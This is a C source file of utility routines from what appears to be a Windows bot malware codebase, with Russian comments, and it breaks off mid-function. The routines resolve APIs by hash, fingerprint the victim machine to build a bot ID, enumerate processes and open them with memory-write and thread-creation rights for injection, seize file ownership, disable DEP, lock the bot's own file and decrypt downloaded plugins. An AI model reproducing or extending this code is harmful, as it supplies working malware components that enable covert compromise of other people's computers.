#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <Iphlpapi.h>

#include "GetApi.h"
#include "Strings.h"
#include "Crypt.h"
#include "Memory.h"
#include "Utils.h"

#include "BotUtils.h"
#include "md5.h"
#include "ntdll.h"
#include "dprint.h"




#define ALIGN_DOWN(x, align) (x &~ (align - 1))

PPEB GetPeb()
{
	__asm mov eax,FS:[0x30] 
};


HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param )
{
    DWORD lpThreadId; 
    return pCreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)lpStartAddress, param, NULL, &lpThreadId );
}

//DWORD CalcHash(char *Str )
//{
//	if (!Str ) return -1;
//
//	DWORD dwHash = 0;
//	char *CopyStr = Str;
//
//	while ( *CopyStr != 0)
//	{
//		dwHash = (( dwHash << 7 ) & (DWORD)( -1 ) ) | ( dwHash >> ( 32 - 7 ));
//		dwHash = dwHash ^ ( *CopyStr );
//		CopyStr++;
//	}
//
//	return dwHash;
//}

//DWORD CalcHashW( PWSTR str )
//{
//	if ( !str )
//	{
//		return 0;
//	}
//
//    DWORD hash = 0;
//    PWSTR s = str;
//
//    while (*s) 
//    {
//        hash = ((hash << 7) & (DWORD)-1) | (hash >> (32 - 7));
//        hash = hash ^ *s;
//        s++;
//    }
//
//    return hash;
//}


char *GetOSInfo()
{
	char *BotOS = (char*)MemAlloc( 1024 );

	if ( BotOS == NULL )
	{
		return NULL;
	}

	//char Unknown[] = { 'u','n','k','n','o','w','n' };
	
	char WinSeven[]  = "W7";
	char Win2008R2[] = "Srv2008R2";

	char Win2008[]   = "Srv2008";
	char WinVista[]  = "Vista";
	char WinXP[]	   = "XP";
	char Win2003R2[] = "Srv2003R2";
	char Win2003[]   = "Srv2003";
	char Win2000[]   = "2000";

	char *ret = NULL;//Unknown;

	OSVERSIONINFOEXA OSVersion;
		
	OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEX );

	if ( !pGetVersionExA( &OSVersion ) )
	{
		return NULL;
	}

	if ( OSVersion.dwMajorVersion == 6  )
	{
		if ( OSVersion.dwMinorVersion == 1 )
		{
			if ( OSVersion.wProductType == VER_NT_WORKSTATION )
			{
				ret = WinSeven;
			}
			else
			{
				ret = Win2008R2;
			}
		}
		else if ( OSVersion.dwMinorVersion == 0 )
		{
			if ( OSVersion.wProductType == VER_NT_WORKSTATION )
			{
				ret = WinVista;
			}
			else
			{
				ret = Win2008;
			}
		}
	}
	else if ( OSVersion.dwMajorVersion == 5 )
	{
		if ( OSVersion.dwMinorVersion == 2 )
		{
			if ( pGetSystemMetrics( SM_SERVERR2 ) != 0 )
			{
				ret = Win2003R2;
			}
			else
			{
				ret = Win2003;
			}
		}
		else if ( OSVersion.dwMinorVersion == 1 )
		{
			ret = WinXP;
		}
		else if ( OSVersion.dwMinorVersion == 0 )
		{
			ret = Win2000;
		}		
	}

	if ( ret == NULL )
	{
		return NULL;
	}

	typedef int ( WINAPI *fwsprintfA )( PCHAR lpOut, PCHAR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	const char* os_bit_version = (CheckWow64() ? "64":"32");

	_pwsprintfA( BotOS, "%s %d %s", ret, OSVersion.wServicePackMajor, os_bit_version);
	
	//if ( m_lstrlen( OSVersion.szCSDVersion ) )
	//{
	//	_pwsprintfA( BotOS, "%s %s build %d version %d.%d x64 %d", ret, OSVersion.szCSDVersion,OSVersion.dwBuildNumber,OSVersion.dwMajorVersion,OSVersion.dwMinorVersion,CheckWow64());
	//}
	//else
	//{
	//	_pwsprintfA( BotOS, "%s build %d version %d.%d x64 %d", ret,OSVersion.dwBuildNumber,OSVersion.dwMajorVersion,OSVersion.dwMinorVersion, CheckWow64());
	//}


	BotOS[ m_lstrlen( BotOS ) ] = '\0';
	for ( DWORD i =0; i < m_lstrlen( BotOS ); ++i )
		if ( BotOS [i] == ' ' ) BotOS[i] = '_';

	char *Ret = BotOS;

	return Ret;
}

char * FileToMD5(char *URL)
{
	//char *BotId = (char*)MemAlloc( 2048 );
	MD5_CTX ctx;	

	MD5Init(&ctx);
	MD5Update( &ctx, (unsigned char*)URL, m_lstrlen( URL ) );

	unsigned char buff[16];	
	MD5Final( buff, &ctx );
	char * UidHash =(char*)MemAlloc( 33 );;

	int p = 0;
	typedef int ( WINAPI *fwsprintfA )( PCHAR lpOut, PCHAR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
	
	for( int i = 0; i < 16; i++ )
	{
		_pwsprintfA( &UidHash[p], "%02X", buff[i] );
		p += 2;
	}	
	
	UidHash[32] = '\0';

	
return UidHash;
}

// добавлено при добавлении оперы
/************************************************************************/
DWORD FileSize(HANDLE hFile)
{
	DWORD filesizeHigh = 0;
	DWORD filesizeLow  = 0;
	filesizeLow = (DWORD)pGetFileSize(hFile, &filesizeHigh);

	return (DWORD)(Int64ShllMod32((unsigned hyper)filesizeHigh, 32) | filesizeLow);
	//return ((((unsigned hyper)filesizeHigh) << 32) | filesizeLow);
}

/************************************************************************/
/*                          Читает файл в буфер                         */
/*----------------------------------------------------------------------*/
int ReadWholeFile(char *szFileName, char **OutBuf, int *Error)
{
	*Error = NOERROR;
	int result = 0;

	// Открываем файл на чтение
	HANDLE hFile = pCreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
														OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	// Если не удалось прочесть, выходим с ошибкой
	if (INVALID_HANDLE_VALUE != hFile)
	{
		DWORD fSize = FileSize(hFile);
		if (fSize > 0)
		{
			DWORD rSize = 0;  
			//*OutBuf = new char[fSize + 1];
			//SecureZeroMemory(*OutBuf, fSize + 1);
			*OutBuf = (char *)MemAlloc(SIZE_T(fSize) + 1);
			if (ReadFile(hFile, *OutBuf, fSize, &rSize, NULL))
				result = rSize;
		}
		// Закрываем файл
		pCloseHandle(hFile);
	}
	// Возвращаем результат
	if (!result)
		*Error = pGetLastError();
	return result;
}

/************************************************************************/
char *CalcFileMD5Hash(char *szFileName)
{
	char *fileData = NULL;
	char *UidHash  = NULL;
	
	int Error = 0;
	int fSize = ReadWholeFile((char *)szFileName, &fileData, &Error);
	if (fSize)
	{
		MD5_CTX ctx;	

		MD5Init(&ctx);
		MD5Update( &ctx, (unsigned char*)fileData, fSize );

		UidHash = (char *)MemAllocAndClear(16);;
		MD5Final((unsigned char *)UidHash, &ctx );

		// Из-под файла
		MemFree(fileData);
	}
	return UidHash;
}




/*
PCHAR WINAPI Decrypt(PCHAR String, PCHAR OutString)
{
	if (STR::IsEmpty(String))
		return NULL;

	PCHAR Res;
	if (OutString != NULL)
		Res = OutString;
	else
	{
		m_memset( szTempBuf, 0, 100);
		Res = szTempBuf;
    }

	__asm
	{
		pushad
		mov		esi,[String]
		//mov		edi,offset szTempBuf
        mov		edi, Res
	__again:
			lodsb
			test	al,al
			jz		__to_exit
			sub		al, 10h
			xor		al, 5h
			add		al, 10h
			stosb
			jmp		__again

	__to_exit:
		stosb
		popad
	} 

	return Res;
}
*/

char *GetPrefix()
{
	// Функция возвращает префикс бота
	return PREFIX_BOT;
}

//------------------------------------------------------------ 
//гениратция нового уида
int myHashData(DWORD lpData, DWORD dwDataSize) 
{
	DWORD dwResult = 0;
	_asm 
	{
		pushad	
		mov edi, lpData
		mov ebx, 0 //hash
		mov ecx, 0 //cr
		mov eax, dwDataSize		
		cmp eax, 0
		jle ERR_BAD_LEN		
	REPEAT_LABEL:
		xor cl, BYTE ptr [edi]  // cr
		xor bl, BYTE ptr [edi]  // cl 
	WHILE_LABEL:
		sub cl, 32
	 		//.endw
		cmp cl, 32
		jge WHILE_LABEL
		rol ebx, cl
		inc edi
		mov dl, BYTE ptr [edi] // cr
		dec eax		
		cmp eax, 0
		jne REPEAT_LABEL
	ERR_BAD_LEN:
		mov dwResult, ebx	
		popad	
		mov eax, dwResult
	}
}

PCHAR MakeMachineID()
{
	//данная функция вернет PCHAR который мочить STR::Free
	
	char szRegPath1[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\0";
	char szDigitalProductId[] = "DigitalProductId\0";
	char szInstallDate[] = "InstallDate\0";
	char szRegId[] = "RegId\0";

	DWORD dwMakeMachineID_done = 0;
	PCHAR szMachineID = STR::Alloc(32) ;
	DWORD iBufferSize = 0;
	int flShouldMakeUniqID = 0;
	DWORD dwExtraHashForMachineID = 0;

	// really run only once
	if (!dwMakeMachineID_done) 
	{
		// try to open some reg key
		HKEY hKey = 0;
		if ( pRegOpenKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR)szRegPath1, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS ) 
		{
			// prepare pCryptKeyBuff
			PVOID pCryptKeyBuff;
			//теоретически правельно использовать размер в страницу, ибо в МСДН написано что все что больше нее храниться не в реестре
			//но читаемый размер всегда равен 164 байта берем с небольшим запасом
			pCryptKeyBuff = STR::Alloc(200); ///pGlobalAlloc(GPTR, 10240);
			// init buffer with not-null pre-defined data to avoid clear data in registry in case of absent DigitalProductId in registry
			m_memset(pCryptKeyBuff, 0x30, 100);

			// try to query DigitalProductId
			iBufferSize = 200;
			if ( pRegQueryValueExA(hKey, (LPCSTR)szDigitalProductId, NULL, NULL, (LPBYTE) pCryptKeyBuff, &iBufferSize) != ERROR_SUCCESS ) 
			{
				flShouldMakeUniqID+=1; 
			}
			// make dwExtraHashForMachineID value
			iBufferSize = 4;
			if ( pRegQueryValueExA(hKey, (LPCSTR)szInstallDate, NULL, NULL, (LPBYTE) &dwExtraHashForMachineID, &iBufferSize) != ERROR_SUCCESS ) 
			{
				flShouldMakeUniqID+=1; 
			}
			// check if we should create / use some uniq id
			if (flShouldMakeUniqID > 0) 
			{
				// first try to read existing extra value into dwGeneratedMachineIDExtraValue
				DWORD dwGeneratedMachineIDExtraValue = 0;
				iBufferSize = 4;
				if ( pRegQueryValueExA(hKey, (LPCSTR)szRegId, NULL, NULL, (LPBYTE) &dwGeneratedMachineIDExtraValue, &iBufferSize) != ERROR_SUCCESS ) 
				{	
					// failed to read extra value, get it from ticks
					// NB: we should use it ONLY if id saved successfully - otherwise to protect self from constant change of 
					//     machine ids, leave dwGeneratedMachineIDExtraValue 0
					dwGeneratedMachineIDExtraValue = (DWORD)pGetTickCount();

					// now try to save it in registry - close read-only handle
					pRegCloseKey(hKey); 

					// try to open in write mode
					if ( pRegOpenKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR)szRegPath1, 0, KEY_READ + KEY_WRITE, &hKey) == ERROR_SUCCESS ) 
					{					
						// try write key, with error-checking
						if ( pRegSetValueExA(hKey, (LPCSTR)szRegId, NULL, REG_DWORD, (LPBYTE) &dwGeneratedMachineIDExtraValue, 4) != ERROR_SUCCESS ) 
						{
							 dwGeneratedMachineIDExtraValue=0;
						}
					} else { dwGeneratedMachineIDExtraValue=0; }
 				}

				// use extra value in any case
				dwExtraHashForMachineID = dwExtraHashForMachineID ^ dwGeneratedMachineIDExtraValue;
			}

			// close reg key
			pRegCloseKey( hKey );

			// shift pCryptKeyBuff pointer by 8 bytes
			// *** now this is MakeMachineID_step2 contents ***

			// make hash from WinID (16+1 bytes from pCryptKeyBuff) [HASH PART 1]
			LPVOID pWinId = (PVOID)((DWORD)pCryptKeyBuff + 8);
			DWORD dwHash1 = myHashData( (DWORD)pWinId, (int)plstrlenA((LPCSTR)pWinId) ) ^ dwExtraHashForMachineID;

			//printf("hash p1 = %04Xh dwExtraHashForMachineID = %04Xh\n", dwHash1, dwExtraHashForMachineID);

			// and part2 using Computer name
			iBufferSize = MAX_COMPUTERNAME_LENGTH+1;
			PCHAR pCompName = STR::Alloc(iBufferSize);//pGlobalAlloc( GPTR,  iBufferSize);
			GetComputerNameA( (LPSTR)pCompName, &iBufferSize);
			DWORD dwHash2 = myHashData( (DWORD)pCompName, (int)plstrlenA((LPSTR)pCompName));
			STR::Free(pCompName);	// pGlobalFree(pCompName);
			STR::Free((PCHAR)pCryptKeyBuff);
			//pGlobalFree(pCryptKeyBuff);
	
			// combine dwHash1 + dwHash2 into szMachineID
			typedef int ( WINAPI *fwsprintfA )( PCHAR lpOut, PCHAR lpFmt, ... );
			fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
			char szMID_format[] = "%08X%08X";

			
			_pwsprintfA(szMachineID, szMID_format, dwHash1, dwHash2);
			
			//printf(szMachineID);			
		}
	}
	// return pointer to global var filled with textual machine-id representation
	return szMachineID;
}

//------------------------------------------------------------
void GenerateUid(char *BotUid)
{
	PCHAR tmp_BotUid=MakeMachineID();

	m_lstrcpy( BotUid, GetPrefix());
	m_lstrcat( BotUid, "0" );
	m_lstrcat( BotUid, tmp_BotUid );
	STR::Free(tmp_BotUid);
	return;


	///далее идет старая
	char *BotId = (char*)MemAlloc( 2048 );
	
	DWORD dwUsernameLen = 255;
	DWORD dwComputerLen = 255;
	
	char *User = (char*)MemAlloc( 255 );
	char *Comp = (char*)MemAlloc( 255 );
	char *Proc = (char*)MemAlloc( 255 );

	if ( BotId == NULL || User == NULL ||
		 Comp  == NULL || Proc == NULL )
	{
		return;
	}

	if ( (BOOL)pGetUserNameA( User, &dwUsernameLen ) )
		m_lstrcat(BotId, User );

	if ( (BOOL)pGetComputerNameA( Comp, &dwComputerLen ) )
		m_lstrcat( BotId, Comp );

	if ( (DWORD)pGetEnvironmentVariableA( "PROCESSOR_IDENTIFIER", Proc, 255 ) )
		m_lstrcat( BotId, Proc );

	MemFree(User);
	MemFree(Comp);
	MemFree(Proc);

//--------------------------

	HW_PROFILE_INFOA HwProfInfo;

	if ( (BOOL)pGetCurrentHwProfileA( &HwProfInfo ) ) 
    {
		m_lstrcat( BotId, HwProfInfo.szHwProfileGuid );
		m_lstrcat( BotId, HwProfInfo.szHwProfileName );
    }   

	char *OS = GetOSInfo();


	if ( OS != NULL )
		m_lstrcat( BotId, OS );

	MemFree(OS);

//--------------------------

	DWORD dwSerial = 0;

	typedef int ( WINAPI *fwsprintfA )( PCHAR lpOut, PCHAR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	if ( (BOOL)pGetVolumeInformationA( 0, NULL, 0, &dwSerial, 0, 0, NULL, 0 ) )
		_pwsprintfA(BotId + m_lstrlen(BotId), "%d", dwSerial );

	MD5_CTX ctx;

	MD5Init(&ctx);
	MD5Update( &ctx, (unsigned char*)BotId, m_lstrlen( BotId ) );

	unsigned char buff[16];	

	MD5Final( buff, &ctx );

	char UidHash[33];

	int p = 0;

	for( int i = 0; i < 16; i++ )
	{
		_pwsprintfA( &UidHash[p], "%02X", buff[i] );
		p += 2;
	}	
	
	UidHash[32] = '\0';

	m_lstrcpy( BotUid, GetPrefix());
	m_lstrcat( BotUid, "0" );
	m_lstrcat( BotUid, UidHash );

	BotUid[ m_lstrlen(BotUid) ] = '\0';

    MemFree(BotId);

	return;
}


LPVOID GetInfoTable(DWORD dwTableType )
{
	LPVOID lpPtr = NULL;

	DWORD dwSize = 0x4000;	

	NTSTATUS Status = 0;

	do
	{
		lpPtr = MemAlloc( dwSize );

		if ( lpPtr == NULL )
		{
			return NULL;
		}

		Status = (DWORD)pZwQuerySystemInformation( dwTableType, lpPtr, dwSize, NULL );

		if ( Status == STATUS_INFO_LENGTH_MISMATCH )
		{
			MemFree( lpPtr );
			dwSize = dwSize * 2;
		}
	} while ( Status == STATUS_INFO_LENGTH_MISMATCH );

	if ( Status == STATUS_SUCCESS )
	{
		return lpPtr;
	}

	MemFree( lpPtr );

	return NULL;
}

DWORD GetCurrentSessionId()
{
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	return Peb->SessionId;
}

DWORD GetProcessIdByHash( DWORD dwHash )
{
	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)GetInfoTable( SystemProcessInformation );

	DWORD dwSessionId = 0;

	DWORD dwPid = -1;

	if ( pProcess != NULL )
	{
		dwSessionId = GetCurrentSessionId();

		do
		{
			if ( dwSessionId == pProcess->uSessionId )
			{
				if ( pProcess->usName.Length )
				{
					PCHAR ProcessName = WSTR::ToAnsi(pProcess->usName.Buffer, 0);

					m_lstrlwr( ProcessName );

					DWORD ProcessHash = CalcHash(ProcessName);
					STR::Free(ProcessName);

					if (ProcessHash  == dwHash )
					{
						dwPid = pProcess->uUniqueProcessId;
						break;
					}
				}
			}			

			pProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD)pProcess + pProcess->uNext );

		} while ( pProcess->uNext != 0 );
	}

	MemFree( pProcess );

	return dwPid;
}

char *GetProcessList()
{
	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)GetInfoTable( SystemProcessInformation );	
	
	char *ProcessList = NULL;

	if ( pProcess != NULL )
	{
		do
		{
			if ( pProcess->usName.Length )
			{
				HANDLE hProcess = (HANDLE)pOpenProcess(PROCESS_QUERY_INFORMATION,FALSE,pProcess->uUniqueProcessId);
				PCHAR ProcessName =   STR::Alloc (MAX_PATH);  // WSTR::ToAnsi(pProcess->usName.Buffer, 0);

				pGetProcessImageFileNameA(hProcess,ProcessName,MAX_PATH);
				pCloseHandle(hProcess);

				m_lstrlwr( ProcessName );

				if ( ProcessList == NULL )
				{
					if ( ( ProcessList = (char*)MemAlloc( m_lstrlen( ProcessName ) + 1 ) ) == NULL )
					{
						return NULL;
					}

					m_lstrcpy( ProcessList, ProcessName );
				}
				else
				{
					char *p = (char*)MemRealloc( ProcessList, m_lstrlen( ProcessList ) + m_lstrlen( ProcessName ) + 2 );

					if ( p == NULL )
					{
						return NULL;
					}

					ProcessList = p;

					m_lstrcat( ProcessList, "," );
					m_lstrcat( ProcessList, ProcessName );
				}
			    STR::Free(ProcessName);
			}

			pProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD)pProcess + pProcess->uNext );

		} while ( pProcess->uNext != 0 );
	}

	MemFree( pProcess );

	return ProcessList;
}


HANDLE OpenProcessEx( DWORD dwHash )
{
	DWORD dwPid = GetProcessIdByHash( dwHash );

	if ( dwPid != -1 )
	{
		OBJECT_ATTRIBUTES ObjectAttributes = { sizeof( ObjectAttributes ) } ;
		CLIENT_ID ClientID;

		ClientID.UniqueProcess = (HANDLE)dwPid;
		ClientID.UniqueThread  = 0;

		HANDLE hProcess;
		
		if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
		{
			return NULL;
		}

		return hProcess;
	}

	return NULL;
}

bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread,PWCHAR CommandLine )
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	m_memset( &si, 0, sizeof( STARTUPINFOW ) );	
	m_memset( &pi, 0, sizeof( PROCESS_INFORMATION ) );	
	
	si.cb		   = sizeof( STARTUPINFO );
	si.dwFlags     = STARTF_USESHOWWINDOW;
	si.wShowWindow = 1;

	if ( (BOOL)pCreateProcessW( Path, CommandLine, NULL, NULL, FALSE, dwFlags, NULL, NULL, &si, &pi ) != 0 )
	{

		*hProcess = pi.hProcess;
		*hThread  = pi.hThread;

		return true;
	}	

	return false;
}


DWORD GetVirtualFreeAddr()
{
	DWORD dwAddr = (DWORD)GetProcAddressEx( NULL, 1, 0x5C17EC75 );
	return dwAddr;
}



DWORD GetFileHash( WCHAR *File )
{
	if ( !File )
	{
		return -1;
	}

	HANDLE hFile = (HANDLE)pCreateFileW( File, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return -1;
	}

	DWORD h = 0;
	DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );

	HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );

	if ( hMapFile == INVALID_HANDLE_VALUE )
	{
		return -1;
	}

	LPBYTE pbyFile  = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

	char Hash[33];
	m_memset( Hash, 0, 33 );

	if ( pbyFile != NULL )
	{
		MD5_CTX ctx;	

		MD5Init(&ctx);
		MD5Update( &ctx, (unsigned char*)pbyFile, dwFileSize );

		unsigned char buff[16];	

		MD5Final( buff, &ctx );

		typedef int ( WINAPI *fwsprintfA )( PCHAR lpOut, PCHAR lpFmt, ... );
		fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

		int p = 0;

		for( int i = 0; i < 16; i++ )
		{
			_pwsprintfA( &Hash[p], "%02X", buff[i] );
			p += 2;
		}	
		
		Hash[32] = '\0';	
	}

	pUnmapViewOfFile( pbyFile );

	pCloseHandle( hFile );
	pCloseHandle( hMapFile );

	if ( !m_lstrlen( Hash ) )
	{
		return -1;
	}

	return CalcHash( Hash );
}


bool GodmodeOnFile( WCHAR *Filename )
{
	BOOLEAN bWasEnabled;
	pRtlAdjustPrivilege( SE_TAKE_OWNERSHIP_PRIVILEGE, TRUE, FALSE, &bWasEnabled );

	HANDLE hToken = NULL;
	pOpenProcessToken( pGetCurrentProcess(), TOKEN_QUERY, &hToken );
	
	PTOKEN_USER pTokenUser = (PTOKEN_USER)MemAlloc( 0x200 );

	if ( pTokenUser == NULL )
	{
		return false;
	}

    DWORD dwSize = 0;
    SECURITY_DESCRIPTOR sdSID;

    if ( !(BOOL)pGetTokenInformation( hToken,(TOKEN_INFORMATION_CLASS)1, pTokenUser, 0x200, &dwSize ) )
	{
		return false;
	}

    if ( !(BOOL)pInitializeSecurityDescriptor( &sdSID, SECURITY_DESCRIPTOR_REVISION ) )
	{
		return false;
	}

    if ( !(BOOL)pSetSecurityDescriptorOwner( &sdSID, pTokenUser->User.Sid, false ) )
	{
		return false;
	}

	pCloseHandle( hToken );
	
	if ( !pSetFileSecurityW( Filename, OWNER_SECURITY_INFORMATION, &sdSID ) )
	{
		return false;
	}
    if ( !pSetFileSecurityW( Filename, DACL_SECURITY_INFORMATION, &sdSID ) )
	{
        return false;
	}

	MemFree( pTokenUser );

	return true;
}

DWORD GetProcessHash()
{
	WCHAR ModulePath[ MAX_PATH ];
	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	return dwProcessHash;
}

HANDLE hBotFile;
HANDLE hBotMap;

void ProtectBot()
{
	WCHAR *BotPath = GetBotPath();

	if ( BotPath )
	{
		hBotFile = (HANDLE)pCreateFileW( BotPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

		if ( hBotFile != (HANDLE)-1 )
		{			
			hBotMap = (HANDLE)pCreateFileMappingW( hBotFile, NULL, PAGE_READONLY, 0, 0, NULL );		
		}
	}

	MemFree( BotPath );
	return;
}

void UnProtectBot()
{
	pCloseHandle( hBotMap  );
	pCloseHandle( hBotFile );

	return;
}


void DisableDEP()
{
	DWORD dwFlags = 0x02;
	pZwSetInformationProcess( (HANDLE)-1, 0x22, &dwFlags, 4 );

	return;
}

LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen )
{
	if ( Pointer != NULL && dwLen > 4 )
	{
		char Signature[] = {'B','J','B',0};

		if ( m_memcmp( Pointer, Signature, 3 ) )
		{
			MemFree( Pointer );
			return NULL;
		}

		dwLen -= 3;
		Pointer = (LPBYTE)( (DWORD)Pointer + 3 );
	}
	else
	{
		return NULL;
	}

	DWORD dwPassLen = *(DWORD*)Pointer;

	Pointer	 += sizeof( DWORD );
	dwLen	 -= sizeof( DWORD );

	char *Password = (char*)MemAlloc( dwPassLen + 1 );
	
	m_memcpy( Password, Pointer, dwPassLen );

	Password[ dwPassLen ] = '\0';

	Pointer += dwPassLen;
	dwLen	-= dwPassLen;

	DWORD dwSize = XORCrypt::Crypt( Password, Pointer, dwLen );

	return Pointer;
}


DWORD ExplorerPid = 0;

DWORD GetExplorerPid()
{
	// Функция возвращает идентификатор процесса эксплорера (Explorer.exe)

	if ( !ExplorerPid )
	{
		// Первым этапом пытаемся получить идентификатор по хэндлу окна системного
		// трэя.
		char Class[] = {'S','h','e','l','l','_','T','r','a','y','W','n','d',0};
		pGetWindowThreadProcessId(pFindWindowA(Class, NULL), &ExplorerPid);
	
		// В случае если не удалось определить идентификатор по хэндлу окна
		// определяем его по имени запущенного процесса	
		if ( !ExplorerPid )
			ExplorerPid = GetProcessIdByHash(0x490A0972);
	}

	return ExplorerPid;
}

//----------------------------------------------------------------------------

// Набор значений для генератора случайных чисел
static DWORD Random_State[16] = {0};

// Индекс генератора случайных чисел
static unsigned int Random_Index = 0;


void Random::Initialize()
{
	// Инициализируем генератор случайных чисел
	for (int i = 0; i < 16; i++)
	{
		Random_State[i] = (DWORD)pGetTickCount();
		pSleep(3 * i);
	}
}


DWORD Random::Generate()
{
	// Генерировать случайное число
	if (Random_State[0] == 0)
		Initialize();


	DWORD a, b, c, d;
	a = Random_State[Random_Index];
	c = Random_State[(Random_Index + 13) & 15];
	b = a^c^(a << 16)^(c << 15);
	c = Random_State[(Random_Index+9)&15];
	c ^= (c>>11);
	a = Random_State[Random_Index] = b^c;
	d = a^((a << 5) & 0xDA442D20UL);
	Random_Index = (Random_Index + 15) & 15;
	a = Random_State[Random_Index];
	Random_State[Random_Index] = a^b^d^(a << 2)^(b << 18)^(c << 28);
	return Random_State[Random_Index];
}


DWORD Random::Generate(DWORD Min, DWORD Max)
{
	// Генерировать случайное число в диапазоне от Min до Max
	DWORD Range = 0;
	DWORD Min_V = 0;

	if (Max >= Min)
	{
		Range = Max - Min;
		Min_V = Min;
	}
	else
	{
		Range = Min - Max;
		Min_V = Max;
	}

	return Generate() % (Range + 1) + Min_V;
}

PCHAR Random::RandomString(DWORD Length, char Min, char Max)
{
	// Генерировать строку случайных символов
	// Min, Max - диапазон генерации символов
	PCHAR Result = STR::Alloc(Length);
	if (Result == NULL) return NULL;

	PCHAR S = Result;
	for (DWORD i = 0; i < Length; i++, S++)
		*S = (char)Random::Generate(Min, Max);
	return Result;
}


//----------------------------------------------------------------------------
PCHAR GenerateBotID()
{
    const DWORD BufSize = 2048;
	PCHAR Buf = (PCHAR)MemAlloc(BufSize);
	if (Buf == NULL)
		return NULL;
    m_memset(Buf, 0, BufSize);

	GenerateUid(Buf);
	PCHAR Result = STR::New(Buf);

	MemFree(Buf);
    return Result;
}

//----------------------------------------------------------------------------

bool DirExists(PCHAR Path)
{
	// Функция возвращает истину если путь Path существует
  DWORD Code = (DWORD)pGetFileAttributesA(Path);
  return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) != 0);
}
//----------------------------------------------------------------------------

bool FileExistsA(PCHAR FileName)
{
	DWORD Code = (DWORD)pGetFileAttributesA(FileName);
	return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) == 0);
}

bool FileExistsW(PWCHAR FileName)
{
	DWORD Code = (DWORD)pGetFileAttributesW(FileName);
		return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) == 0);
}

//----------------------------------------------------------------------------


bool InvalidPath(char *Path)
{
	// Функция вернёт истину в случае если путь один из ".", ".."
	return (StrSame(Path, ".") || StrSame(Path,".."));
}

struct TRecursiveSearchData
{
	PCHAR Mask;
	LPVOID Data;
    DWORD Attributes;
    TFilesCallBack CallBack;
};

void RecursuveSearchCallBack(PFindData Find, PCHAR Path, LPVOID Data, bool &Cancel)
{
	// Ищем файлы в директории
	TRecursiveSearchData *SD = (TRecursiveSearchData *)Data;
	Cancel = SearchFiles(Path, SD->Mask, false, SD->Attributes, SD->Data, SD->CallBack) == false;
}

bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
				 LPVOID Data, TFilesCallBack CallBack)
{
	// Функция пербирает все поддериктории
	if (STR::IsEmpty(Path) || STR::IsEmpty(Mask) || CallBack == NULL)
		return true;

	PCHAR SearchMask = STR::New(2, Path, Mask);
	if (SearchMask == NULL)
		return true;

	//  Ищем первую директорию
	WIN32_FIND_DATAA Find;
	HANDLE File = pFindFirstFileA(SearchMask, &Find);
	//  Директория не найдена, выходим из функции
	if (File == INVALID_HANDLE_VALUE)
	{
		STR::Free(SearchMask);
		DWORD Error = (DWORD)pGetLastError();

		if (Error != 5 /* Нет доступа */ && Recursive && DirExists(Path))
		{
			TRecursiveSearchData SD;
			SD.Mask = Mask;
			SD.Data = Data;
			SD.Attributes = FileAttributes;
			SD.CallBack = CallBack;
			return SearchFiles(Path, "*.*", true, FA_DIRECTORY, &SD, RecursuveSearchCallBack);
		}
		else
			return true;
	}

	bool Cancel = false;
	bool RecursiveHandled = false;
    DWORD Count = 0;
	PCHAR NewPath;
	DWORD Attributes = FileAttributes;

	if (Recursive)
		Attributes = Attributes | FILE_ATTRIBUTE_DIRECTORY;

	do
	{
        if (!InvalidPath(Find.cFileName))
		if ((Find.dwFileAttributes & Attributes) != 0)
		{
            Count++;
			// Собираем полное имя
            if ((Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
				NewPath = STR::New(3, Path, Find.cFileName, "\\");
			else
				NewPath = STR::New(2, Path, Find.cFileName);

			// Вызываем метод обратной связи
